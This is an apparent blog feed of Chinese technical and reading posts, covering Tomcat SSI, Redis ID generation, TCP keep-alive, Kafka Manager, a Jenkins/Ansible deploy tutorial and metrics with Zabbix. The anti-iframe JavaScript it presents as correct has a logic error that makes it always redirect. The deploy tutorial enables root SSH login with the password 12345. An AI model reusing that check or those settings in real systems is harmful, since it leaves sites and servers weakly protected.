也就是说，如果要支持“#include virtual=”/b.shtml”绝对路径这种指令，就要配置isVirtualWebappRelative为true。但是tomcat默认的SSI配置，以及上面的EnhancedSSIServlet类默认都配置isVirtualWebappRelative为false。 因此，把EnhancedSSIServlet类里的isVirtualWebappRelative配置为true，重新测试，发现已经可以正常处理”#include virtual=”/b.shtml”指令了。 相关的逻辑处理的代码在org.apache.catalina.ssi.SSIServletExternalResolver.getServletContextAndPathFromVirtualPath( String virtualPath)：123456789101112131415protected ServletContextAndPath getServletContextAndPathFromVirtualPath( String virtualPath) throws IOException &#123; if (!virtualPath.startsWith("/") &amp;&amp; !virtualPath.startsWith("\\")) &#123; return new ServletContextAndPath(context, getAbsolutePath(virtualPath)); &#125; String normalized = RequestUtil.normalize(virtualPath); if (isVirtualWebappRelative) &#123; return new ServletContextAndPath(context, normalized); &#125; ServletContext normContext = context.getContext(normalized); if (normContext == null) &#123; throw new IOException("Couldn't get context for path: " + normalized); &#125; 总结之前的EnhancedSSIServlet类的配置就不支持”#include virtual=”/b.shtml”，这种绝对路径的SSI指令，而以前版本的Tomcat因为恰好处理了”/test.shtml”这种以”/“开头的url，因此以前版本的Tomcat没有报错。而升级后的Tomcat修正了代码，不再处理这种不合理的绝对路径请求了，所以报“ Couldn’t get context for path”的异常。 把tomcat的ssi配置里的isVirtualWebappRelative设置为true就可以了。 最后，留一个小问题： tomcat是如何知道处理*.jsp请求的？是哪个servlet在起作用？ 参考https://tomcat.apache.org/tomcat-7.0-doc/ssi-howto.html]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>tomcat</tag>
        <tag>ssi</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《一百个人的十年》和《1984》]]></title>
    <url>%2Ften-years-of-madness-and-1984%2F</url>
    <content type="text"><![CDATA[推荐先看《一百个人的十年》，再看《1984》。两本书都比较压抑，注意舒缓心情。 《一百个人的十年》前一段时间在微博上有一个比较火的文章《拾纸救夫》，是冯骥才的《一百个人的十年》里的第一个故事。我看了之后，决定去看下完整的《一百个人的十年》。 今天在写这个blog的时候，本来想找个《拾纸救夫》的链接的，却发现网上的版本都是删节过的。建议还是去看下完整版的，里面有很多细节。 作者之所以把《拾纸救夫》作为第一个故事，因为它的非常震撼人心。同为小人物的我，在读完只觉得全身都冰凉。 作者是亲自录音，笔录采访，花了十多年才完成这部纪实作品，很值得一读。 123 于一九八六年,开始进行这部名为 《一百个人的十年》的口述实录文学。由此至今, 已近十载,收到要求被采访者信件近四千封,采访数百人;摘其所具独特性且富于深刻者撰文成书。 --《关于本书写作的缘起》 《1984》在看了《一百个人的十年》之后，偶然看到了《1984》的名字。尽管之前多次看到这个名字，而且也在自己的收藏书单里，但是却从没有开始读过。这次下决心读完。 在看《1984》的过程中，一度以为是写来讽剌文革的。但是在看了一些书评之后，发现成书于1949年。作者是有感于二战的历史而写的。据说在文革时，《1984》在中国也有流传，可以想像当时的人是怀着怎样的心情在读着这本书的。而在读完之后，又是怀着怎样的心情揣测着自己的未来。 有时候人们（包括我自己）会有一种想法： 1这么荒唐的事情怎么会发生？这样的事情在今后是不可能再发生了。 在二战前，很多人都认为二战不会爆发。在今天，很多人也无法理解当年文革的情形。 所以，要保持谦卑谨慎，保持警惕，很多事情都有可能发生。]]></content>
      <categories>
        <category>读书</category>
      </categories>
      <tags>
        <tag>读书</tag>
        <tag>1984</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于redis的分布式ID生成器]]></title>
    <url>%2Fredis-id-generator%2F</url>
    <content type="text"><![CDATA[项目地址https://github.com/hengyunabc/redis-id-generator 基于redis的分布式ID生成器。 准备首先，要知道redis的EVAL，EVALSHA命令： http://redis.readthedocs.org/en/latest/script/eval.html http://redis.readthedocs.org/en/latest/script/evalsha.html 原理利用redis的lua脚本执行功能，在每个节点上通过lua脚本生成唯一ID。生成的ID是64位的： 使用41 bit来存放时间，精确到毫秒，可以使用41年。 使用12 bit来存放逻辑分片ID，最大分片ID是4095 使用10 bit来存放自增长ID，意味着每个节点，每毫秒最多可以生成1024个ID 比如GTM时间 Fri Mar 13 10:00:00 CST 2015 ，它的距1970年的毫秒数是 1426212000000，假定分片ID是53，自增长序列是4，则生成的ID是： 15981966696448054276 = 1426212000000 &lt;&lt; 22 + 53 &lt;&lt; 10 + 4 redis提供了TIME命令，可以取得redis服务器上的秒数和微秒数。因些lua脚本返回的是一个四元组。 1second, microSecond, partition, seq 客户端要自己处理，生成最终ID。 1((second * 1000 + microSecond / 1000) &lt;&lt; (12 + 10)) + (shardId &lt;&lt; 10) + seq; 集群实现原理假定集群里有3个节点，则节点1返回的seq是：10, 3, 6, 9, 12 ... 节点2返回的seq是11, 4, 7, 10, 13 ... 节点3返回的seq是12, 5, 8, 11, 14 ... 这样每个节点返回的数据都是唯一的。 单个节点部署下载redis-script-node1.lua，并把它load到redis上。123cd redis-directory/wget https://raw.githubusercontent.com/hengyunabc/redis-id-generator/master/redis-script-node1.lua./redis-cli script load "$(cat redis-script-node1.lua)" 获取lua脚本的sha1值，可能是：1fce3758b2e0af6cbf8fea4d42b379cd0dc374418 在代码里，通过EVALSHA命令，传递这个sha1值，就可以得到生成的ID。 比如，通过命令行执行：1./redis-cli EVALSHA fce3758b2e0af6cbf8fea4d42b379cd0dc374418 2 test 123456789 结果可能是：12341) (integer) 14262382862) (integer) 1305323) (integer) 2774) (integer) 4 集群部署假定集群是3个节点，则分别对三个节点执行：123./redis-cli -host node1 -p 6379 script load "$(cat redis-script-node1.lua)" ./redis-cli -host node2 -p 7379 script load "$(cat redis-script-node2.lua)" ./redis-cli -host node3 -p 8379 script load "$(cat redis-script-node3.lua)" 性能redis默认配置。 123456单节点，单线程：time:0:00:00.959speed:10427.52867570386单节点，20线程：time:0:00:06.710speed:29806.259314456034 结论： 单节点，qps约3w 可以线性扩展，3个结点足以满足绝大部分的应用 java客户端封装在redis-id-generator-java目录下，有example和benchmark代码。 在调用时，要传入两个参数 tag，即为哪一类服务生成ID shardId，即分片由哪个ID生成，比如一个用户的订单，则分片ID应该由userId来生成 123456789101112131415161718192021public class Example &#123; public static void main(String[] args) &#123; String tab = "order"; long userId = 123456789; IdGenerator idGenerator = IdGenerator.builder() .addHost("127.0.0.1", 6379, "fce3758b2e0af6cbf8fea4d42b379cd0dc374418")// .addHost("127.0.0.1", 7379, "1abc55928f37176cb934fc7a65069bf32282d817")// .addHost("127.0.0.1", 8379, "b056d20feb3f89483b10c81027440cbf6920f74f") .build(); long id = idGenerator.next(tab, userId); System.out.println("id:" + id); List&lt;Long&gt; result = IdGenerator.parseId(id); System.out.println("miliSeconds:" + result.get(0) + ", partition:" + result.get(1) + ", seq:" + result.get(2)); &#125;&#125; 多语言客户端只要支持redis evalsha命令就可以了。 其它之前写的一个blog：分片(Sharding)的全局ID生成]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>redis</tag>
        <tag>lua</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么基于TCP的应用需要心跳包（TCP keep-alive原理分析）]]></title>
    <url>%2Fwhy-we-need-heartbeat%2F</url>
    <content type="text"><![CDATA[TCP keep-alive的三个参数用man命令，可以查看linux的tcp的参数：1man 7 tcp 其中keep-alive相关的参数有三个：123456789101112tcp_keepalive_intvl (integer; default: 75; since Linux 2.4) The number of seconds between TCP keep-alive probes.tcp_keepalive_probes (integer; default: 9; since Linux 2.2) The maximum number of TCP keep-alive probes to send before giving up and killing the connection if no response is obtained from the other end.tcp_keepalive_time (integer; default: 7200; since Linux 2.2) The number of seconds a connection needs to be idle before TCP begins sending out keep-alive probes. Keep- alives are sent only when the SO_KEEPALIVE socket option is enabled. The default value is 7200 seconds (2 hours). An idle connection is terminated after approximately an additional 11 minutes (9 probes an interval of 75 seconds apart) when keep-alive is enabled. 这些的默认配置值在/proc/sys/net/ipv4 目录下可以找到。 可以直接用cat来查看文件的内容，就可以知道配置的值了。也可以通过sysctl命令来查看和修改：12345# 查询cat /proc/sys/net/ipv4/tcp_keepalive_timesysctl net.ipv4.tcp_keepalive_time#修改sysctl net.ipv4.tcp_keepalive_time=3600 上面三个是系统级的配置，在编程时有三个参数对应，可以覆盖掉系统的配置：123TCP_KEEPCNT 覆盖 tcp_keepalive_probes，默认9（次）TCP_KEEPIDLE 覆盖 tcp_keepalive_time，默认7200（秒）TCP_KEEPINTVL 覆盖 tcp_keepalive_intvl，默认75（秒） tcp keep-alive的本质TCP keep-alive probe上面了解了tcp keep-alive的一些参数，下面来探究下其本质。 在远程机器192.168.66.123上，用nc启动一个TCP服务器：1nc -l 9999 在本地机器上，用python创建一个socket去连接，并且用wireshark抓包分析12345678import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 20)s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 1)s.connect(('192.168.66.123', 9999)) 上面的程序，设置了TCP_KEEPIDLE为20，TCP_KEEPINTVL为1，系统默认的tcp_keepalive_probes是9。 当网络正常，不做干扰时，wireshark抓包的数据是这样的（注意看第二列Time）： 可以看到，当3次握手完成之后，每隔20秒之后66.120发送了一个TCP Keep-Alive的数据包，然后66.123回应了一个TCP Keep-Alive ACK包。这个就是TCP keep-alive的实现原理了。 当发送了第一个TCP Keep-Alive包之后，拨掉192.168.66.123的网线，然后数据包是这样子的： 可以看到，当远程服务器192.168.66.123网络失去连接之后，本地机器（192.168.66.120）每隔一秒重发了9次tcp keep-alive probe，最终认为这个TCP连接已经失效，发了一个RST包给192.168.66.123。 三个参数的具体意义TCP_KEEPIDLE ：这个参数是多久没有发送数据时，开始发送Keep-Alive包的时间，也就是链路空闲时间。TCP_KEEPINTVL：这个参数是指发送Keep-Alive probe后，对方多久没有回应，然后重新再发送keep alive probe的时间间隔TCP_KEEPCNT：这个参数指，连续发送多少次keep alive probe，对方没有回应，认为连接已经失效的重试次数 如果不能理解或者有混淆，仔细对照下上面的两张图片就可以明白了。 为什么应用层需要heart beat/心跳包？默认的tcp keep-alive超时时间太长默认是7200秒，也就是2个小时。 socks proxy会让tcp keep-alive失效socks协议只管转发TCP层具体的数据包，而不会转发TCP协议内的实现细节的包（也做不到），参考socks_proxy。 所以，一个应用如果使用了socks代理，那么tcp keep-alive机制就失效了，所以应用要自己有心跳包。 socks proxy只是一个例子，真实的网络很复杂，可能会有各种原因让tcp keep-alive失效。 移动网络需要信令保活前两年，微信信令事件很火，搜索下“微信 信令”或者“移动网络 信令”可以查到很多相关文章。 这里附上一个链接：微信的大规模使用真的会过多占用信令，影响通讯稳定吗？ 总结 TCP keep-alive是通过在空闲时发送TCP Keep-Alive数据包，然后对方回应TCP Keep-Alive ACK来实现的。 为什么需要heart beat/心跳包？因为tcp keep-alive不能满足人们的实时性的要求，就是这么简单。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>socket</tag>
        <tag>tcp</tag>
        <tag>wireshark</tag>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《北京人在纽约》]]></title>
    <url>%2Fabout-A-Native-of-Beijing-in-New-York%2F</url>
    <content type="text"><![CDATA[在过年前，看到了这则新闻：儿女很近 幸福很远:美国华裔老人的悲惨生活。另外，也在微博看到一些信息，很多留学生选择回到中国。 忽然很想看下《北京人在纽约》，了解下当年移民到美国的人的心态。 在网上找了一阵子，在土豆上找到有字幕的： http://www.tudou.com/albumcover/5w7hXnW8xdI.html 过年时看完了，也谈不上什么感想。 意外地发现了导演居然是冯小刚，艾=未-来。冯小刚在电影的最后还打了个酱油。 本来以为当年移民美国的人，以读书，技术移民比较多。没想到像王启明/郭燕这样不会英语的人，也敢出国。电视剧的结尾，非常贴心的告诉观众，三年后主角们的状况。而如果他们真实存在，现在也变成老人了，不知会如何。移民必然会有很多故事，无所谓值不值得与后悔。 扯远一点，毫无疑问，现在国人的民族自豪感大大增强了。记得以前和同学谈话时，说到民族自豪感：12村与村之间有斗争，打架，没有人敢欺负比较团结、流氓的村。如果某条村子被欺负了，而不能争回面子的话，那么村民也抬不起头来。国家之间也是如此。]]></content>
      <categories>
        <category>文化</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Cookie & Session & CSRF]]></title>
    <url>%2Fcookie-and-session-and-csrf%2F</url>
    <content type="text"><![CDATA[在线幻灯片地址： Cookie &amp; Session &amp; CSRF]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>cookie</tag>
        <tag>session</tag>
        <tag>nginx</tag>
        <tag>CSRF</tag>
        <tag>spring</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[防止页面被iframe恶意嵌套]]></title>
    <url>%2Fprevent-iframe-stealing%2F</url>
    <content type="text"><![CDATA[缘起在看资料时，看到这样的防止iframe嵌套的代码：123456789101112131415161718192021222324try &#123; if (window.top != window.self) &#123; var ref = document.referer; if (ref.substring(0, 2) === '//') &#123; ref = 'http:' + ref; &#125; else if (ref.split('://').length === 1) &#123; ref = 'http://' + ref; &#125; var url = ref.split('/'); var _l = &#123;auth: ''&#125;; var host = url[2].split('@'); if (host.length === 1) &#123; host = host[0].split(':'); &#125; else &#123; _l.auth = host[0]; host = host[1].split(':'); &#125; var parentHostName = host[0]; if (parentHostName.indexOf("test.com") == -1 &amp;&amp; parentHostName.indexOf("test2.com") == -1) &#123; top.location.href = "http://www.test.com"; &#125; &#125;&#125; catch (e) &#123;&#125; 假定test.com，test2.com是自己的域名，当其它网站恶意嵌套本站的页面时，跳转回本站的首页。 上面的代码有两个问题： referer拼写错误，实际上应该是referrer 解析referrer的代码太复杂，还不一定正确 无论在任何语言里，都不建议手工写代码处理URL。因为url的复杂度超出一般人的想像。很多安全的问题就是因为解析URL不当引起的。比如防止CSRF时判断referrer。 URI的语法： http://en.wikipedia.org/wiki/URI_scheme#Generic_syntax 在javascript里解析url最好的办法在javascript里解析url的最好办法是利用浏览器的js引擎，通过创建一个a标签：1234567var getLocation = function(href) &#123; var l = document.createElement("a"); l.href = href; return l;&#125;;var l = getLocation("http://example.com/path");console.debug(l.hostname) 简洁防iframe恶意嵌套的方法下面给出一个简洁的防止iframe恶意嵌套的判断方法：12345678910111213if(window.top != window &amp;&amp; document.referrer)&#123; var a = document.createElement("a"); a.href = document.referrer; var host = a.hostname; var endsWith = function (str, suffix) &#123; return str.indexOf(suffix, str.length - suffix.length) !== -1; &#125; if(!endsWith(host, '.test.com') || !endsWith(host, '.test2.com'))&#123; top.location.href = "http://www.test.com"; &#125;&#125; java里处理URL的方法http://docs.oracle.com/javase/tutorial/networking/urls/urlInfo.html 用contain, indexOf, endWitch这些函数时都要小心。 1234567891011121314public static void main(String[] args) throws Exception &#123; URL aURL = new URL("http://example.com:80/docs/books/tutorial" + "/index.html?name=networking#DOWNLOADING"); System.out.println("protocol = " + aURL.getProtocol()); System.out.println("authority = " + aURL.getAuthority()); System.out.println("host = " + aURL.getHost()); System.out.println("port = " + aURL.getPort()); System.out.println("path = " + aURL.getPath()); System.out.println("query = " + aURL.getQuery()); System.out.println("filename = " + aURL.getFile()); System.out.println("ref = " + aURL.getRef()); &#125; 参考http://stackoverflow.com/questions/736513/how-do-i-parse-a-url-into-hostname-and-path-in-javascript http://stackoverflow.com/questions/5522097/prevent-iframe-stealing]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>iframe</tag>
        <tag>html</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kafka manager安装]]></title>
    <url>%2Fkafka-manager-install%2F</url>
    <content type="text"><![CDATA[项目信息https://github.com/yahoo/kafka-manager 这个项目比 https://github.com/claudemamo/kafka-web-console 要好用一些，显示的信息更加丰富，kafka-manager本身可以是一个集群。 不过kafka-manager也没有权限管理功能。 Kafka web console的安装可以参考之前的blog： http://blog.csdn.net/hengyunabc/article/details/40431627 安装sbtsbt是scala的打包构建工具。 http://www.scala-sbt.org/download.html ubuntu下安装：123echo "deb https://dl.bintray.com/sbt/debian /" | sudo tee -a /etc/apt/sources.list.d/sbt.listsudo apt-get updatesudo apt-get install sbt 下载，编绎编绎，生成发布包： 123git clone https://github.com/yahoo/kafka-managercd kafka-managersbt clean dist 生成的包会在kafka-manager/target/universal 下面。生成的包只需要java环境就可以运行了，在部署的机器上不需要安装sbt。 如果打包很慢的话，可以考虑配置代理。 部署打好包好，在部署机器上解压，修改好配置文件，就可以运行了。 解压 1unzip kafka-manager-1.0-SNAPSHOT.zip 修改conf/application.conf，把kafka-manager.zkhosts改为自己的zookeeper服务器地址 1kafka-manager.zkhosts=&quot;localhost:2181&quot; 启动 12cd kafka-manager-1.0-SNAPSHOT/bin./kafka-manager -Dconfig.file=../conf/application.conf 查看帮助 和 后台运行：12./kafka-manager -hnohup ./kafka-manager -Dconfig.file=../conf/application.conf &gt;/dev/null 2&gt;&amp;1 &amp; 默认http端口是9000，可以修改配置文件里的http.port的值，或者通过命令行参数传递：1./kafka-manager -Dhttp.port=9001 正常来说，play框架应该会自动加载conf/application.conf配置里的内容，但是貌似这个不起作用，要显式指定才行。 参考： https://github.com/yahoo/kafka-manager/issues/16 sbt 配置代理sbt的配置http代理的参考文档： http://www.scala-sbt.org/0.12.1/docs/Detailed-Topics/Setup-Notes.html#http-proxy 通过-D设置叁数即可：1java -Dhttp.proxyHost=myproxy -Dhttp.proxyPort=8080 -Dhttp.proxyUser=username -Dhttp.proxyPassword=mypassword 也可以用下面这种方式，设置一下SBT_OPTS的环境变量即可：1export SBT_OPTS="$SBT_OPTS -Dhttp.proxyHost=myproxy -Dhttp.proxyPort=myport" 要注意的是，myproxy，这个值里不要带http前缀，也不要带端口号。 比如，你的代理是http://localhost:8123，那么应该这样配置：1export SBT_OPTS="$SBT_OPTS -Dhttp.proxyHost=localhost -Dhttp.proxyPort=8123" 打好的一个包如果打包有问题的小伙伴可以从这里下载： http://pan.baidu.com/s/1kTtFpGV md5： bde4f57c4a1ac09a0dc7f3f892ea9026]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一步一步用jenkins，ansible，supervisor打造一个web构建发布系统]]></title>
    <url>%2Fdeploy-system-jenkins-ansible-supervisor%2F</url>
    <content type="text"><![CDATA[一步一步用jenkins，ansible，supervisor打造一个web构建发布系统。 本来应该还有gitlab这一环节的，但是感觉加上，内容会增加很多。所以直接用github上的spring-mvc-showcase项目来做演示。 https://github.com/spring-projects/spring-mvc-showcase 本文的环境用docker来构建。当然也可以任意linux环境下搭建。 如果没有安装docker，可以参考官方的文档：https://docs.docker.com/installation/ubuntulinux/#ubuntu-trusty-1404-lts-64-bit 下面将要介绍的完整流程是： github作为源代码仓库 jenkins做为打包服务器，Web控制服务器 ansible把war包，发布到远程机器 安装python-pip 用pip安装supervisor 安装jdk 下载，部署tomcat 把tomcat交由supervisor托管 把jenkins生成的war包发布到远程服务器上 supervisor启动tomcat 在http端口等待tomcat启动成功 supervisor托管app进程，提供一个web界面可以查看进程状态，日志，控制重启等。 在文章的最后，会给出一个完整的docker镜像，大家可以自己运行查看实际效果。 安装jenkins 先用docker来启动一个名为“jenkins”的容器： 1sudo docker run -i -t -p 8080:8080 -p 8101:8101 -p 9001:9001 --name='jenkins' ubuntu /bin/bash 8080是jenkins的端口，8101是spring-mvc-showcase的端口，9001是supervisor的web界面端口 执行完之后，会得到一个container的shell。接着在这个shell里安装其它组件。 安装open jdk 和 git： 12sudo apt-get updatesudo apt-get install openjdk-7-jdk git 下载配置tomcat： 12345apt-get install wgetmkdir /opt/jenkinscd /opt/jenkinswget http://apache.fayea.com/tomcat/tomcat-8/v8.0.18/bin/apache-tomcat-8.0.18.tar.gztar xzf apache-tomcat-8.0.18.tar.gz 安装jenkins： 1234cd /opt/jenkins/apache-tomcat-8.0.18/webappswget http://mirrors.jenkins-ci.org/war/latest/jenkins.warrm -rf ROOT*mv jenkins.war ROOT.war 启动jenkins： 1/opt/jenkins/apache-tomcat-8.0.18/bin/startup.sh 然后在本机用浏览器访问：http://localhost:8080/ ，可以看到jenkins的界面了。 配置jenkins安装git插件安装git插件：https://wiki.jenkins-ci.org/display/JENKINS/Git+Plugin 在“系统管理”，“插件管理”，“可选插件”列表里，搜索“Git Plugin”，这样比较快可以找到。 因为jenkins用google来检查网络的连通性，所以可能在开始安装插件时会卡住一段时间。 配置maven, java打开 http://localhost:8080/configure，在jenkins的系统配置里，可以找到maven，git，java相关的配置，只要勾选了，在开时执行job时，会自动下载。 JDK可以选择刚才安装好的openjdk，也可以选择自动安装oracle jdk。 Git会自动配置好。 配置ssh服务安装sshd服务：1sudo apt-get install openssh-server sshpass 编辑vi /etc/ssh/sshd_config把1PermitRootLogin without-password 改为：1PermitRootLogin yes 重启ssh服务：1sudo /etc/init.d/ssh restart 为root用户配置密码，设置为12345：1passwd 最后尝试登陆下：1ssh root@127.0.0.1 安装ansible在jenkins这个container里，继续安装ansible，用来做远程发布用。 先安装pip，再用pip安装ansible：12sudo apt-get install python-pip python-dev build-essential gitsudo pip install ansible 配置ansible playbook把自动发布的ansible playbook clone到本地： https://github.com/hengyunabc/jenkins-ansible-supervisor-deploy123mkdir -p /opt/ansiblecd /opt/ansiblegit clone https://github.com/hengyunabc/jenkins-ansible-supervisor-deploy 在jenkins上建立deploy job 新建一个maven的项目/job，名为spring-mvc-showcase 在配置页面里，勾选“参数化构建过程”，再依次增加“String”类型的参数 共有这些参数：12345678app 要发布的app的名字 http_port tomcat的http端口 https_port tomcat的https端口 server_port tomcat的server port JAVA_OPTS tomcat启动的Java参数 deploy_path tomcat的目录 target_host 要发布到哪台机器 war_path jenkins生成的war包的目录 “源码管理”，选择Git，再填入代码地址 https://github.com/spring-projects/spring-mvc-showcase.git 在“Post Steps”里，增加调用ansible playbook的shell命令 12cd /opt/ansible/jenkins-ansible-supervisor-deployansible-playbook -i hosts site.yml --verbose --extra-vars "target_host=$target_host app=$app http_port=$http_port https_port=$https_port server_port=$server_port deploy_path=$deploy_path JAVA_HOME=/usr JAVA_OPTS=$JAVA_OPTS deploy_war_path=$WORKSPACE/$war_path" 最后，保存。 测试构建一切都配置好之后，可以在jenkins界面上，在左边，选择“Build with Parameters”，“开始”来构建项目了。 如果构建成功的话，就可以打开 http://localhost:8101 ，就可以看到spring-mvc-showcase的界面了。 打开 http://localhost:9001 可以看到superviosr的控制网页，可以查看tomcat进程的状态，重启，查看日志等。 如果想要发布到其它机器上的话，只要在 1234567 /opt/ansible/jenkins-ansible-supervisor-deploy/hosts ``` 文件里增加相应的host配置就可以了。## 其它的一些东东如果提示 to use the ‘ssh’ connection type with passwords, you must install the sshpass program123则安装：```bashsudo apt-get install sshpass 演示的docker image如果只是想查看实际运行效果，可以直接把 hengyunabc/jenkins-ansible-supervisor 这个image拉下来，运行即可。 1docker run -it -p 8080:8080 -p 8101:8101 -p 9001:9001 --name='jenkins' hengyunabc/jenkins-ansible-supervisor 总结 jenkins提供了丰富的插件，可以定制自己的打包这过程，并可以提供完善的权限控制 ansible可以轻松实现远程部署，配置环境等工作，轻量简洁，功能强大 supervisor托管了tomcat进程，提供了web控制界面，所有运行的程序一目了然，很好用]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>jenkins</tag>
        <tag>ansible</tag>
        <tag>supervisor</tag>
        <tag>docker</tag>
        <tag>devops</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于dropwizard/metrics ，kafka，zabbix构建应用统计数据收集展示系统]]></title>
    <url>%2Fabout-metrics%2F</url>
    <content type="text"><![CDATA[想要实现的功能 应用可以用少量的代码，实现统计某类数据的功能 统计的数据可以很方便地展示 metricsmetrics，按字面意思是度量，指标。 举具体的例子来说，一个web服务器： 一分钟内请求多少次？ 平均请求耗时多长？ 最长请求时间？ 某个方法的被调用次数，时长？ 以缓存为例： 平均查询缓存时间？ 缓存获取不命中的次数/比例？ 以jvm为例： GC的次数？ Old Space的大小？ 在一个应用里，需要收集的metrics数据是多种多样的，需求也是各不同的。需要一个统一的metrics收集，统计，展示平台。 流行的metrics的库https://github.com/dropwizard/metricsjava实现，很多开源项目用到，比如hadoop，kafka。下面称为dropwizard/metrics。 https://github.com/tumblr/colossusscala实现，把数据存到OpenTsdb上。 spring boot 项目里的metrics： http://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-metrics.html spring boot里的metrics很多都是参考dropwizard/metrics的。 metrics的种类dropwizard/metrics 里主要把metrics分为下面几大类： https://dropwizard.github.io/metrics/3.1.0/getting-started/ Gaugesgauge用于测量一个数值。比如队列的长度：12345678910111213public class QueueManager &#123; private final Queue queue; public QueueManager(MetricRegistry metrics, String name) &#123; this.queue = new Queue(); metrics.register(MetricRegistry.name(QueueManager.class, name, "size"), new Gauge&lt;Integer&gt;() &#123; @Override public Integer getValue() &#123; return queue.size(); &#125; &#125;); &#125;&#125; Counterscounter是AtomicLong类型的gauge。比如可以统计阻塞在队列里的job的数量：123456789private final Counter pendingJobs = metrics.counter(name(QueueManager.class, "pending-jobs"));public void addJob(Job job) &#123; pendingJobs.inc(); queue.offer(job);&#125;public Job takeJob() &#123; pendingJobs.dec(); return queue.take();&#125; Histogramshistogram统计数据的分布。比如最小值，最大值，中间值，还有中位数，75百分位, 90百分位, 95百分位, 98百分位, 99百分位, and 99.9百分位的值(percentiles)。 比如request的大小的分布：123456private final Histogram responseSizes = metrics.histogram(name(RequestHandler.class, "response-sizes"));public void handleRequest(Request request, Response response) &#123; // etc responseSizes.update(response.getContent().length);&#125; Timerstimer正如其名，统计的是某部分代码/调用的运行时间。比如统计response的耗时：1234567891011private final Timer responses = metrics.timer(name(RequestHandler.class, "responses"));public String handleRequest(Request request, Response response) &#123; final Timer.Context context = responses.time(); try &#123; // etc; return "OK"; &#125; finally &#123; context.stop(); &#125;&#125; Health Checks这个实际上不是统计数据。是接口让用户可以自己判断系统的健康状态。如判断数据库是否连接正常：123456789101112131415161718final HealthCheckRegistry healthChecks = new HealthCheckRegistry();public class DatabaseHealthCheck extends HealthCheck &#123; private final Database database; public DatabaseHealthCheck(Database database) &#123; this.database = database; &#125; @Override public HealthCheck.Result check() throws Exception &#123; if (database.isConnected()) &#123; return HealthCheck.Result.healthy(); &#125; else &#123; return HealthCheck.Result.unhealthy("Cannot connect to " + database.getUrl()); &#125; &#125;&#125; Metrics Annotation利用dropwizard/metrics 里的annotation，可以很简单的实现统计某个方法，某个值的数据。如：12345678910111213/** * 统计调用的次数和时间 */@Timedpublic void call() &#123;&#125;/** * 统计登陆的次数 */@Countedpublic void userLogin()&#123;&#125; 想要详细了解各种metrics的实际效果，简单的运行下测试代码，用ConsoleReporter输出就可以知道了。 metrics数据的传输和展示dropwizard/metrics 里提供了reporter的接口，用户可以自己实现如何处理metrics数据。 dropwizard/metrics有不少现成的reporter：1234567ConsoleReporter 输出到stdoutJmxReporter 转化为MBeanmetrics-servlets 提供http接口，可以查询到metrics信息CsvReporter 输出为CSV文件Slf4jReporter 以log方式输出GangliaReporter 上报到GangliaGraphiteReporter 上报到Graphite 上面的各种reporter中，Ganglia开源多年，但缺少一些监控的功能，图形展示也很简陋。Graphite已经停止开发了。 而公司所用的监控系统是zabbix，而dropwizard/metrics没有现成的zabbix reporter。 zabbix的限制zabbix上报数据通常用zabbix agent或者zabbix trapper。用户自己上报的数据通常用zabbix trapper来上报。 zabbix上收集数据的叫item，每个item都有自己的key，而这些item不会自动创建。zabbix有Low-level discovery，可以自动创建item，但是也相当麻烦，而且key的命名非常奇怪。不如直接用template了。 https://www.zabbix.com/documentation/2.4/manual/discovery/low_level_discovery 假定zabbix上不同的应用的key都是相对固定的，那么就可以通过模板的方式，比较方便地统一创建item, graph了。 另外想要实现自动创建item，比较好的办法是通过zabbix api了。 但目前Java版没有实现，于是实现了一个简单的： https://github.com/hengyunabc/zabbix-api dropwizard/metrics zabbix reporter基于上面的template的思路，实现了一个dropwizard/metrics 的zabbix reporter。 原理是，通过zabbix sender，把metrics数据直接发送到zabbix server上。 https://github.com/hengyunabc/zabbix-sender https://github.com/hengyunabc/metrics-zabbix dropwizard/metrics发送到kafka，再从kafka发到zabbix上面的方案感觉还是不太理想： 没有实现自动化，还要手动为每一个应用配置template，不够灵活 所有的数据都发送到一个zabbix server上，担心性能有瓶颈于是，新的思路是，把metrics数据发送到kafka上，然后再从kafka上消费，再把数据传到zabbix server上。 这样的好处是： kafka可以灵活扩容，不会有性能瓶颈 从kafka上消费metrics数据，可以灵活地用zabbix api来创建item, graph 于是实现了两个新项目： https://github.com/hengyunabc/metrics-kafka https://github.com/hengyunabc/kafka-zabbix Java程序先把metrics数据上报到kafka，然后kafka consumer从metrics数据里，提取出host, key信息，再用zabbix-api在zabbix server上创建item，最后把metrics数据上报给zabbix server。 自动创建的zabbix item的效果图： 在zabbix上显示的用户自定义的统计数据的图： 数据的聚合比如，统计接口的访问次数，而这个接口部署在多台服务器上，那么如何展示聚合的数据？ zabbix自带有聚合功能，参考： http://opsnotes.net/2014/10/24/zabbix_juhe/ 实战：Zabbix 聚合功能配置与应用 metrics的实现的探讨从dropwizard/metrics里，我们可以看到一种简单直观的实现： app内收集统计数据，计算好具体的key/value 定时上报 另外，用分布式调用追踪（dapper/zipkin）的办法，也可以实现部分metrics的功能。比如某个方法的调用次数，缓存命中次数等。 当然，两者只是部分功能有重合。 dropwizard/metrics 是一种轻量级的手段，用户可以随意增加自己想要的统计数据，代码也很灵活。有些简单直观的统计数据如果用分布式调用追踪的方式来做，显然会比较吃力，得不偿失。 